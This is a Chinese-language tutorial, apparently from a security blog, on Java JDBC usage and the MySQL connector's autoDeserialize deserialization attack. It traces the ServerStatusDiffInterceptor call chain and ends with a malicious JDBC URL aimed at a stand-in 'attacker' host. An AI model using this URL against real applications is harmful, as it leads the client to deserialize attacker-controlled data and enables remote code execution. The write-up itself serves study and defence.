# JDBC攻击

JDBC（Java DataBase Connectivity），是Java程序访问数据库的标准接口。常用的关系数据库包括：付费的（`Oracle、SQL Server、DB2、Sybase`）、开源的（`MySQL、PostgreSQL、Sqlite`）。JDBC接口通过JDBC驱动来访问数据库，而JDBC驱动由各个数据库厂商提供，也就是不同的数据库对应有各自的驱动。使用JDBC的好处就是不需要根据不同的数据库做开发，拥有统一的接口。

## JDBC应用

假如使用MySQL的JDBC驱动，只需要在maven中引入对应的jar包。scope设置为runtime，因为编译时并不需要此jar包，只在运行期使用。
```
<dependency>
    <groupId>mysql</groupId>
    <artifactId>mysql-connector-java</artifactId>
    <version>5.1.47</version>
    <scope>runtime</scope>
</dependency>
```

使用jdbc连接mysql中student数据库（mysql驱动后面跟的可选扩展参数包括`loadDataLocal、requireSSL、socksProxyHost、useAsyncProtocol、useServerPrepStmts、allowUrlInLoadLocal`等）
```java
String JDBC_URL = "jdbc:mysql://localhost:3306/student?requireSSL=false";
String JDBC_USER = "root";
String JDBC_PASSWORD = "password";
try (Connection conn = DriverManager.getConnection(JDBC_URL, JDBC_USER, JDBC_PASSWORD)) { // 获取数据库连接
    try (Statement stmt = conn.createStatement()) {
        try (ResultSet rs = stmt.executeQuery("SELECT id, name FROM students WHERE id=1")) {
            while (rs.next()) { // 获取列数据
                int id = rs.getInt(1); // ResultSet 索引从1开始，而不是0
                String name = rs.getString(2);
            }
        }
    }
}
conn.close();
```

`Statement`容易引发SQL注入，想要完全避免SQL注入可以使用`PreparedStatement`，使用占位符的方式。
```java
try (Connection conn = DriverManager.getConnection(JDBC_URL, JDBC_USER, JDBC_PASSWORD)) {
    try (PreparedStatement ps = conn.prepareStatement("SELECT id, name FROM students WHERE id=?")) {
        ps.setObject(1, id);
        try (ResultSet rs = ps.executeQuery()) {
            while (rs.next()) {
                int id = rs.getInt("id");
                String name = rs.getString("name");
            }
        }
    }
}
```

## JDBC攻击

上面提到mysql驱动的URL可选扩展参数有很多，其中一个叫做`autoDeserialize`，如果配置为true，客户端会自动反序列化服务端返回的数据。mysql-connector-java.jar中的类`com/mysql/cj/jdbc/result/ResultSetImpl.class#getObject()`方法如下。如果autoDeserialize属性值为true，就会进行反序列化操作。
```java
byte[] data = this.getBytes(columnIndex);
if (!(Boolean)this.connection.getPropertySet().getBooleanProperty(PropertyKey.autoDeserialize).getValue()) {
    return data;
} else {
    Object obj = data;
    if (data != null && data.length >= 2) {
        ...
        try {
            ByteArrayInputStream bytesIn = new ByteArrayInputStream(data);
            ObjectInputStream objIn = new ObjectInputStream(bytesIn);
            obj = objIn.readObject();
            objIn.close();
            bytesIn.close();
        } 
}
```
但是默认情况下客户端不会调用getObject()方法。就像找反序列化调用链一样需要找到上层的调用。https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf这篇给出的链条如下
```
com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor#postProcess/preProcess
  com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor#populateMapWithSessionStatusValues
    ResultSetUtil#resultSetToMap
```
最终走到的resultSetToMap方法如下，调用了getObject()方法
```java
public static void resultSetToMap(Map mappedValues, ResultSet rs) throws SQLException {
    while (rs.next()) {
        mappedValues.put(rs.getObject(1), rs.getObject(2));
    }
}
```
`ServerStatusDiffInterceptor`实现自QueryInterceptor接口，它对应扩展参数queryInterceptors。那么就可以构造一个恶意的JDBC URI
```
jdbc:mysql://attacker/db?queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true
```
